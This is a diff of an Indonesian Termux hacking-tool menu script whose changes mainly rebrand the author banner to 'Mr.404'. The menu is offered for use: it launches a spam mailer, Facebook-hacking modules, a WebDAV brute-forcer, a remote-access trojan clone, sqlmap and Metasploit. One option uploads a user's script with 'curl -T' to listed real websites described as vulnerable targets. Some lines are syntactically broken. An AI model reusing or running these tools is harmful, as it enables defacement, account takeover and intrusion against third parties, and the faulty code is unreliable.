@@ -435,12 +435,12 @@ echo "[===============================================]>"
 echo $yellow "0.> keluar"
 echo "[+]===============================================[+]"
 echo "\033[32;1m"
-read -p "root@T00Ls-B4J1N64Nv6~#" bro
+read -p "root@T00Ls-MR.404~#" bro
 
 if [ $bro = 1 ] || [ $bro = 1 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 php tp.php
 fi
 
@@ -448,139 +448,139 @@ if
 [ $bro = 2 ] || [ $bro = 2 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 php t.php
 fi
 
 if [ $bro = 3 ] || [ $bro = 3 ]
 then
-figlet "Mr.B4J1N64N"
+figlet "Mr.404"
 php mataharimall.php
 fi
 
 if [ $bro = 4 ] || [ $bro = 4 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 php hooq.php
 fi
 
 if [ $bro = 5 ] || [ $bro = 5 ]
 then
 clear
-toilet -f slant --gay "Mr.B4J1N64N"
+toilet -f slant --gay "Mr.404"
 php kfc.php
 fi
 
 if [ $bro = 6 ] || [ $bro = 6 ]
 then
 clear
-toilet -f mono12 -F gay "Mr.B4J1N64N"
+toilet -f mono12 -F gay "Mr.404"
 php phd.php
 fi
 
 if [ $bro = 7 ] || [ $bro = 7 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 php whiskas.php
 fi
 
 if [ $bro = 8 ] || [ $bro = 8 ]
 then
 clear
-figlet "Mr.B4J1N64N"
+figlet "Mr.404"
 php zipay.php
 fi
 
 if [ $bro = 9 ] || [ $bro = 9 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 php key.php
 fi
 
 if [ $bro = 10 ] || [ $bro = 10 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 SpamMail.py
 fi
 
 if [ $bro = 11 ] || [ $bro = 11 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 whs.py
 fi
 
 if [ $bro = 12 ] || [ $bro = 12 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 upf.py
 fi
 
 if [ $bro = 13 ] || [ $bro = 13 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 create.py
 fi
 
 if [ $bro = 14 ] || [ $bro = 14 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 dog.py
 fi
 
 if [ $bro = 15 ] || [ $bro = 15 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 gam.py
 fi
 
 if [ $bro = 16 ] || [ $bro = 16 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 anvima.py
 fi
 
 if [ $bro = 17 ] || [ $bro = 17 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 htmd.py
 fi
 
 if [ $bro = 18 ] || [ $bro = 18 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 php autolike.php
 fi
 
 if [ $bro = 19 ] || [ $bro = 19 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.404"
 python2 auto_reaction.py
 fi
 
 if [ $bro = 20 ] || [ bro = 20 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 python2 botkomen.py
 fi
 
 if [ $bro = 21 ] || [ $bro = 21 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 git clone https://github.com/kuburan/txtool
 mv txtool $HOME
 cd $HOME/txtool
@@ -593,7 +593,7 @@ fi
 if [ $bro = 22 ] || [ bro = 22 ]
 then
 clear
-toilet -f slant -F gay "Mr.B4J1N64N" 
+toilet -f slant -F gay "Mr.404" 
 pkg install update && pkg install upgrade
 pkg install git
 pkg install php
@@ -604,7 +604,7 @@ fi
 if [ $bro = 23 ] || [ $bro = 23 ]
 then
 clear
-toilet -f mono12 -F gay "Mr.B4J1N64N" 
+toilet -f mono12 -F gay "Mr.404" 
 apt upgrade
 apt install python2
 apt install git
@@ -617,7 +617,7 @@ fi
 if [ $bro = 24 ] || [ $bro = 24 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.404" 
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/h2I5HU3W-so"
 sleep 3
 apt update
@@ -633,7 +633,7 @@ fi
 if [ $bro = 25 ] || [ $bro = 25 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.404" 
 apt update
 apt install git
 apt install tor
@@ -647,7 +647,7 @@ fi
 if [ $bro = 26 ] || [ $bro = 26 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.404" 
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/EskgepQSB7U"
 sleep 3
 apt update
@@ -662,7 +662,7 @@ fi
 if [ $bro = 27  || [ $bro = 27 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.404" 
 apt update
 apt install git
 git clone https://github.com/b3-v3r/Hunner.git
@@ -675,7 +675,7 @@ fi
 if [ $bro = 28 ] || [ $bro = 28 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.404"
 apt update
 apt install git
 git clone https://github.com/sqlmapproject/sqlmap
@@ -688,7 +688,7 @@ fi
 if [ $bro = 29 ] || [ $bro = 29 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.404" 
 apt update
 apt install git
 git clone https://github.com/aryanrtm/4wsectools
@@ -701,7 +701,7 @@ fi
 if [ $bro = 30 ] || [ $bro = 30 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 apt update && upgrade
 apt install python2 
 apt install git
@@ -712,7 +712,7 @@ fi
 if [ $bro = 31 ] || [ $bro = 31 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 echo "\033[32;m====================Mempercepat / menstabilkan sinyal===================="
 sleep 1
@@ -726,7 +726,7 @@ fi
 if [ $bro = 32 ] || [ $bro = 32 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 echo "\033[32;m===================Mempercepat / menstabilkan sinyal 2===================="
 sleep 1
@@ -740,7 +740,7 @@ fi
 if [ $bro = 33 ] || [ $bro = 33 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 git clone https://github.com/Hood3dRob1n/BinGoo
 mv BinGoo $HOME
@@ -751,7 +751,7 @@ fi
 if [ $bro = 34 ] || [ $bro = 34 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 cd module
 python2 facebook.py
@@ -760,7 +760,7 @@ fi
 if [ $bro = 35 ] || [ $bro = 35 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install termux-api
@@ -775,7 +775,7 @@ fi
 if [ $bro = 36 ] || [ $bro = 36 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install ruby
@@ -790,7 +790,7 @@ fi
 if [ $bro = 37 ] || [ $bro = 37 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install python2
@@ -806,7 +806,7 @@ fi
 if [ $bro = 38 ] || [ $bro = 38 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1 
 apt install git
 apt install php
@@ -820,7 +820,7 @@ fi
 if [ $bro = 39 ] || [ $bro = 39 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1 
 apt install git
 apt install php
@@ -833,7 +833,7 @@ fi
 if [ $bro = 40 ] || [ $bro = 40 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1 
 apt install git
 apt install bash
@@ -847,7 +847,7 @@ fi
 if [ $bro = 41 ] || [ $bro = 41 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 git clone https://github.com/MrKeepSmile/errorcybertool.git
 mv errorcybertool $HOME
@@ -859,7 +859,7 @@ fi
 if [ $bro = 42 ] || [ $bro = 42 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 git clone https://github.com/Xi4u7/A-Rat.git
 mv A-Rat $HOME
@@ -870,7 +870,7 @@ fi
 if [ $bro = 43 ] || [ $bro = 43 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 git clone https://github.com/DarknessCyberTeam/Scan-Website-Admin-Login
 mv Scan-Website-Admin-Login $HOME
@@ -882,8 +882,8 @@ if [ $bro = 44 ] || [ $bro = 44 ]
 then
 clear
 echo "\033[34;1m"
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet -f slant MrB4J1N64N
+cowsay -f kiss.cow Mr.404" | lolcat
+figlet -f slant Mr404
 echo "\033[37;1m"
 echo "Masukan Web target"
 echo "Contoh Web Target vuln"
@@ -898,7 +898,7 @@ echo "	http://Bheh.co.za/"
 read -p "[MrB4J1N64N]>" target
 echo "Masukan Nama script kalian"
 echo "yang ada di Luar Folder Ruang Penyimpanan"
-read -p "[MrB4J1N64N]>" script
+read -p "[Mr404]>" script
 curl -T /storage/emulated/0/$script $target
 echo "\033[33;1m"
 echo "Selesai! Tod Cek di $target $script "
@@ -907,8 +907,8 @@ fi
 if [ $bro = 45 ] || [ $bro = 45 ]
 then
 clear
-cowsay -f sheep.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f sheep.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 cd
 cd module
@@ -918,8 +918,8 @@ fi
 if [ $bro = 46 ] || [ $bro = 46 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 cd module
 python2 r.py
@@ -929,10 +929,10 @@ if [ $bro = 47 ] || [ $bro = 47 ]
 then
 clear
 toilet -f standard -F gay "BruteWebdav"
-echo "\033[32;1mauthor: Mr.B4J1N64N"
-echo "\033[33;1mTeam: Darkness Cyber Team"
+echo "\033[32;1mauthor: Mr.404"
+echo "\033[33;1mTeam: Anonymous Cyber Team"
 echo "\033[34;1mIndonesia Security Lite"
-echo "\033[32;1mJawaBarat Blackhat Army"
+echo "\033[32;1mkalimantan whitehat Army"
 echo "Masukan nama script"
 read -p "[=======>" script
 echo "\033[32;1m"
@@ -984,8 +984,8 @@ fi
 if [ $bro = 48 ] || [ $bro = 48 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 pkg install w3m
 w3m www.google.com
@@ -994,8 +994,8 @@ fi
 if [ $bro = 49 ] || [ $bro = 49 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install pip
@@ -1010,8 +1010,8 @@ fi
 if [ $bro = 50 ] || [ $bro = 50 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 cd module
 python2 cinta.py
@@ -1020,8 +1020,8 @@ fi
 if [ $bro = 51 ] || [ $bro = 51 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 pkg install php
 pkg install wget
@@ -1033,8 +1033,8 @@ fi
 if [ $bro = 52 ] || [ $bro = 52 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 pkg install curl
 curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
@@ -1050,8 +1050,8 @@ fi
 if [ $bro = 53 ] || [ $bro = 53 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr404" | lolcat
+figlet "Mr.404" | lolcat
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/FsI4pCapfLY"
 sleep 3
 cd module
@@ -1061,8 +1061,8 @@ fi
 if [ $bro = 54 ] || [ $bro = 54 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install python2
@@ -1081,8 +1081,8 @@ if [ $bro = 55 ] || [ $bro = 55 ]
 then
 clear
 echo "\033[31;1m"
-cowsay ghostbusters.cow "MrB4J1N64N" 
-figlet "Mr.B4J1N64N" | lolcat
+cowsay ghostbusters.cow "Mr404" 
+figlet "Mr.404" | lolcat
 apt update && apt upgrade
 apt install python2
 apt install python
@@ -1098,8 +1098,8 @@ fi
 if [ $bro = 56 ] || [ $bro = 56 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt install php
 apt install curl
@@ -1112,7 +1112,7 @@ fi
 if [ $bro = 57 ] || [ $bro = 57 ]
 then
 clear
-toilet -f slant --gay "Mr.B4J1N64N"
+toilet -f slant --gay "Mr.404"
 apt update && apt upgrade
 apt install git
 apt install clang
@@ -1128,7 +1128,7 @@ fi
 if [ $bro = 58 ] || [ $bro = 58 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.404" | lolcat
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1mhttps://youtu.be/VuCvj-8JIME"
 sleep 3
 apt install git
@@ -1147,8 +1147,8 @@ fi
 if [ $bro = 59 ] || [ $bro = 59 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install python2
@@ -1165,8 +1165,8 @@ fi
 if [ $bro = 60 ] || [ $bro = 60 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install php
@@ -1181,8 +1181,8 @@ fi
 if [ $bro = 61 ] || [ $bro = 61 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1196,8 +1196,8 @@ fi
 if [ $bro = 62 ] || [ $bro = 62 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1212,8 +1212,8 @@ fi
 if [ $bro = 63 ] || [ $bro = 63 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1228,8 +1228,8 @@ fi
 if [ $bro = 64 ] || [ $bro = 64 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1244,8 +1244,8 @@ fi
 if [ $bro = 65 ] || [ $bro = 65 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1263,8 +1263,8 @@ fi
 if [ $bro = 66 ] || [ $bro = 66 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "Mr.404" | lolcat
+figlet "Mr.404" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1279,7 +1279,7 @@ fi
 if [ $bro = 67 ] || [ $bro = 67 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/qJc1KaD3QcQ"
 sleep 5
 pkg install git
@@ -1293,7 +1293,7 @@ fi
 if [ $bro = 68 ] || [ $bro = 68 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 echo "Copy Link nya => Paste Ke Browser"
 
 echo "\033[33;1mCara Hack Facebook Di Termux:" "\033[36;1m https://youtu.be/FsI4pCapfLY"
@@ -1350,7 +1350,7 @@ fi
 if [ $bro = 69 ] || [ $bro = 69 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/Us11rFsJb7A"
 sleep 5
 pkg install irssi
@@ -1360,7 +1360,7 @@ fi
 if [ $bro = 70 ] || [ $bro = 70 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/nw9_ECb8VQA"
 sleep 5
 pkg install python2
@@ -1374,7 +1374,7 @@ fi
 if [ $bro = 71 ] || [ $bro = 71 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/LU0QMstAI88"
 sleep 5
 pkg install php
@@ -1391,7 +1391,7 @@ fi
 if [ $bro = 72 ] || [ $bro = 72 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 pkg install moon-buggy
 moon-buggy
 fi
@@ -1399,7 +1399,7 @@ fi
 if [ $bro = 73 ] || [ $bro = 73 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/yIf57xxWaoI"
 sleep 5
 pkg install git
@@ -1413,7 +1413,7 @@ fi
 if [ $bro = 74 ] || [ $bro = 74 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/F2hjIGg4RtI"
 sleep 5
 pkg install python2
@@ -1425,7 +1425,7 @@ fi
 if [ $bro = 75 ] || [ $bro = 75 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.404"
 pkg install git
 pkg install python2
 git clone https://github.com/CiKu370/md5-crack.git
@@ -1437,7 +1437,7 @@ fi
 if [ $bro = 76 ] || [ $bro = 76 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/I5yMLbjvhiY"
 pkg install python2
 pkg install php
@@ -1455,7 +1455,7 @@ fi
 if [ $bro = 77 ] || [ $bro = 77 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.404"
 pkg install python
 pkg install git
 pkg install php
@@ -1469,7 +1469,7 @@ fi
 if [ $bro = 78 ] || [ $bro = 78 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.404"
 pkg update && pkg upgrade
 pkg install git 
 pkg install python2
@@ -1482,7 +1482,7 @@ fi
 if [ $bro = 79 ] || [ $bro = 79 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.404"
 pkg install neofetech
 neofetech
 fi
@@ -1490,7 +1490,7 @@ fi
 if [ $bro = 80 ] || [ $bro = 80 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.404"
 pkg install python2
 pkg install git
 git clone https://github.com/CiKu370/lhst
@@ -1502,7 +1502,7 @@ fi
 if [ $bro = 81 ] || [ $bro = 81 ]
 then
 clear
-"Mr.B4J1N64N"
+"Mr.404"
 sleep 1
 apt-get update && apt-get upgrade
 apt-get install git
@@ -1516,7 +1516,7 @@ fi
 if [ $bro = 82 ] || [ $bro = 82 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N " | lolcat
+toilet -f big -F gay "Mr.404 " | lolcat
 sleep 1
 echo -e $green "Sedang Menginstall"
 sleep 1
@@ -1533,7 +1533,7 @@ fi
 if [ $bro = 83 ] || [ $bro = 83 ]
 then
 clear
-toilet -f big -F gay " Mr.B4J1N64N " | lolcat
+toilet -f big -F gay " Mr.404 " | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1549,7 +1549,7 @@ fi
 if [ $bro = 84 ] || [ $bro = 84 ]
 then
 clear
-toilet -f big -F gay " Mr.B4J1N64N "
+toilet -f big -F gay " Mr.404 "
 sleep 1
 apt update && apt upgrade
 apt install wget
@@ -1565,7 +1565,7 @@ fi
 if [ $bro = 85 ] || [ $bro = 85 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1578,7 +1578,7 @@ fi
 if [ $bro = 86 ] || [ $bro = 86 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update && apt upgrade
 pkg install php
@@ -1592,7 +1592,7 @@ fi
 if [ $bro = 87 ] || [ $bro = 87 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" 
+toilet -f big -F gay "Mr.404" 
 sleep 1
 apt update 
 apt upgrade
@@ -1607,7 +1607,7 @@ fi
 if [ $bro = 88 ] || [ $bro = 88 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" | lolcat
+toilet -f big -F gay "Mr.404" | lolcat
 sleep 1
 apt update 
 apt upgrade
@@ -1622,7 +1622,7 @@ fi
 if [ $bro = 89 ] || [ $bro = 89 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" | lolcat
+toilet -f big -F gay "Mr.404" | lolcat
 sleep 1
 apt update 
 apt upgrade
@@ -1637,7 +1637,7 @@ fi
 if [ $bro = 90 ] || [ $bro = 90 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" | lolcat
+toilet -f big -F gay "Mr.404" | lolcat
 sleep 1
 apt update 
 apt upgrade
@@ -1652,7 +1652,7 @@ fi
 if [ $bro = 91 ] || [ $bro = 91 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" | lolcat
+toilet -f big -F gay "Mr.404" | lolcat
 sleep 1
 apt update 
 apt upgrade
@@ -1682,7 +1682,7 @@ fi
 if [ $bro = 93 ] || [ $bro = 93 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 aptupdate
 apt upgrade
@@ -1699,7 +1699,7 @@ fi
 if [ $bro = 94 ] || [ $bro = 94 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update
 apt upgrade
@@ -1713,7 +1713,7 @@ fi
 if [ $bro = 95 ] || [ $bro = 95 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update
 apt upgrade
@@ -1728,7 +1728,7 @@ fi
 if [ $bro = 96 ] || [ $bro = 96 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1743,7 +1743,7 @@ fi
 if [ $bro = 97 ] || [ $bro = 97 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1758,7 +1758,7 @@ fi
 if [ $bro = 98 ] || [ $bro = 98 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1773,7 +1773,7 @@ fi
 if [ $bro = 99 ] || [ $bro = 99 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1788,7 +1788,7 @@ fi
 if [ $bro = 100 ] || [ $bro = 100 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1803,7 +1803,7 @@ fi
 if [ $bro = 101 ] || [ $bro = 101 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1818,7 +1818,7 @@ fi
 if [ $bro = 102 ] || [ $bro = 102 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1833,7 +1833,7 @@ fi
 if [ $bro = 103 ] || [ $bro = 103 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1848,7 +1848,7 @@ fi
 if [ $bro = 104 ] || [ $bro = 104 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1863,7 +1863,7 @@ fi
 if [ $bro = 105 ] || [ $bro = 105 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1878,7 +1878,7 @@ fi
 if [ $bro = 106 ] || [ $bro = 106 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1893,7 +1893,7 @@ fi
 if [ $bro = 107 ] || [ $bro = 107 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1908,7 +1908,7 @@ fi
 if [ $bro = 108 ] || [ $bro = 108 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1924,7 +1924,7 @@ fi
 if [ $bro = 109 ] || [ $bro = 109 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1939,7 +1939,7 @@ fi
 if [ $bro = 110 ] || [ $bro = 110 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1955,7 +1955,7 @@ fi
 if [ $bro = 111 ] || [ $bro = 111 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1970,7 +1970,7 @@ fi
 if [ $bro = 112 ] || [ $bro = 112 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -1985,7 +1985,7 @@ fi
 if [ $bro = 113 ] || [ $bro = 113 ]
 then
